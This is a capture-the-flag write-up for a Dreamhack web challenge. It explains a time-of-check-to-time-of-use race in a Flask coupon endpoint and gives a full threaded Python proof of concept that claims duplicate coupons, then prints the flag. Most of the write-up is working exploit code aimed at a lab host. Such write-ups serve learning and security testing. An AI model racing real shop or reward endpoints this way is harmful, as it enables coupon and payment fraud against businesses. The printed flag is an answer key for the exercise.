The website is vulnerable to a race condition - Applying multiple coupons to a single session

1. `/coupon/claim`
```python
@app.route('/coupon/claim')
@get_session()
def coupon_claim(user):
    if user['coupon_claimed']:
        raise BadRequest('You already claimed the coupon!')

    coupon_uuid = uuid4().hex
    data = {'uuid': coupon_uuid, 'user': user['uuid'], 'amount': 1000, 'expiration': int(time()) + COUPON_EXPIRATION_DELTA}
    uuid = user['uuid']
    user['coupon_claimed'] = True
    coupon = jwt.encode(data, JWT_SECRET, algorithm='HS256').decode('utf-8')
    r.setex(f'SESSION:{uuid}', timedelta(minutes=10), dumps(user))
    return jsonify({'coupon': coupon})

```
This is a `TOCTOU` (Time-of-Check to Time-of-Use) vulnerability. There is no locking mechanism or atomic operation between checking `user['coupon_claimed']` and updating it to True.

2. submit coupon
```python
RATE_LIMIT_DELTA = 10
...
rate_limit_key = f'RATELIMIT:{user["uuid"]}'
if r.setnx(rate_limit_key, 1):
    r.expire(rate_limit_key, timedelta(seconds=RATE_LIMIT_DELTA))
else:
    raise BadRequest(f"Rate limit reached!, You can submit the coupon once every {RATE_LIMIT_DELTA} seconds.")
```
Each user (identified by `UUID`) is only allowed to submit a coupon once every 10 seconds.

3. POC
```python
import requests
import threading
import time

BASE_URL = "http://host3.dreamhack.games:11227"


def get_session():
    r = requests.get(f"{BASE_URL}/session")
    return r.json()["session"]


def claim_coupon(uuid, results, barrier):
    headers = {"Authorization": uuid}

    # Synchronize all threads so they send requests at nearly the same time
    barrier.wait()

    r = requests.get(f"{BASE_URL}/coupon/claim", headers=headers)

    if r.status_code == 200:
        results.append(r.json()["coupon"])


def submit_coupon(uuid, coupon):
    headers = {
        "Authorization": uuid,
        "coupon": coupon
    }

    return requests.get(f"{BASE_URL}/coupon/submit", headers=headers)


def claim_flag(uuid):
    headers = {"Authorization": uuid}
    return requests.get(f"{BASE_URL}/flag/claim", headers=headers)


def main():
    # 1. Create a new session
    uuid = get_session()
    print(f"[+] Session uuid: {uuid}")

    # 2. Exploit the race condition to obtain multiple coupons
    results = []
    num_threads = 20
    barrier = threading.Barrier(num_threads)
    threads = []

    for _ in range(num_threads):
        t = threading.Thread(
            target=claim_coupon,
            args=(uuid, results, barrier)
        )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(f"[+] Number of coupons received: {len(results)}")

    if len(results) < 2:
        print("[-] Not enough coupons. Try running the exploit again.")
        return

    # 3. Submit the first two coupons, with a 10-second delay between submissions
    for i, coupon in enumerate(results[:2]):
        print(f"[*] Submitting coupon {i + 1}...")

        r = submit_coupon(uuid, coupon)

        print(f"    Status: {r.status_code} - {r.text}")

        if i == 0:
            print("[*] Waiting 10 seconds for the rate limit to reset...")
            time.sleep(10)

    # 4. Claim the flag
    print("[*] Claiming the flag...")

    r = claim_flag(uuid)

    print(f"[+] Result: {r.status_code} - {r.text}")


if __name__ == "__main__":
    main()
```

flag: `DH{781b791fa0ef98ff734bf37ec95bf5c27fd95710e6745274f045b376b590fb42}`